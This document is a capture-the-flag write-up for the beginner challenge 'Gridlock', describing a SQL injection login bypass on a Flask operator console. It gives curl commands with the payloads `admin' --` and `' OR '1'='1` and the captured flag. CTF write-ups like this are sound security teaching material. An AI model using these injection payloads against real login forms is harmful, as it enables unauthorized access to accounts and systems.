# Gridlock

> **Category:** Beginner / PPC · **Event:** KubSTU CTF 2026 Autumn
> Author team: mpei_larpers · Source: https://ctftime.org/writeup/41132 (CTFtime community writeup)

## 📌 Task

http://159.194.244.226:8081/ — the "GRIDLOCK" operator console on gunicorn/Flask. A login form; you have to get in "as admin".

## 🏁 Solution

There was no need to brute-force passwords: in the `/login` handler the database query is glued together as a string, so both fields are injectable. An ordinary comment bypass:

```bash
curl -i -c jar.txt -d "username=admin' --&password=x" \
     http://159.194.244.226:8081/login
# 302 Location: /console + Flask session cookie
```

`--` commented out the rest of the query, the password check fell away, and the server returned the first row of the users table — the admin (uid=1, role=admin). The cookie decodes to `{"role":"admin","uid":1,"username":"admin"}`. After that I simply open the console with this cookie:

```bash
curl -b jar.txt http://159.194.244.226:8081/console
# ... kubstu{gr1dl0ck_4dm1n_byp4ss_a59c3848}
```

Minor details: `admin' #` does not work — `#` is not a comment in SQLite; in the password field `' OR '1'='1` fires. There are no other leads on the service: `/admin`, `/api`, `/.git/HEAD` give 404, `?lang=` has nothing interesting, and response times are flat too.

**Flag:** `kubstu{gr1dl0ck_4dm1n_byp4ss_a59c3848}`
